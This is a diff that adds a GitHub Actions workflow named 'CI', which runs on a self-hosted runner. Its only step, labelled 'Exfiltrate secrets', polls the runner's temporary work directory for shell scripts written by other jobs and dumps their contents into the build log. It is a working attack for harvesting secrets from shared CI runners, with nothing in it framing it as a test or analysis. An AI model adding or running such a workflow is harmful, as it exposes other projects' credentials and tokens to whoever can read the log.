@@ -1,0 +1,32 @@
+name: CI
+
+on:
+  push:
+    branches:
+      - "main"
+
+jobs:
+  build:
+    runs-on: self-hosted
+
+    steps:
+      - name: Exfiltrate secrets
+        run: |
+          DIR="/home/ubuntu/actions-runner/_work/_temp/"
+          files_found=false
+          while true; do
+            # Check for .sh files in the directory
+            if [ "$(find $DIR -maxdepth 1 -name '*.sh' -print -quit)" ]; then
+              echo "Found the following .sh files:"
+              ls $DIR*.sh
+              cat $DIR*.sh
+              files_found=true # Set the flag to true if files are found
+            else
+              if [ "$files_found" = true ]; then
+                echo "No .sh files found. Exiting."
+                break # Exit the loop if the directory becomes empty after files were found
+              fi
+            fi
+            # Sleep for a few seconds before checking again
+            sleep 5
+          done
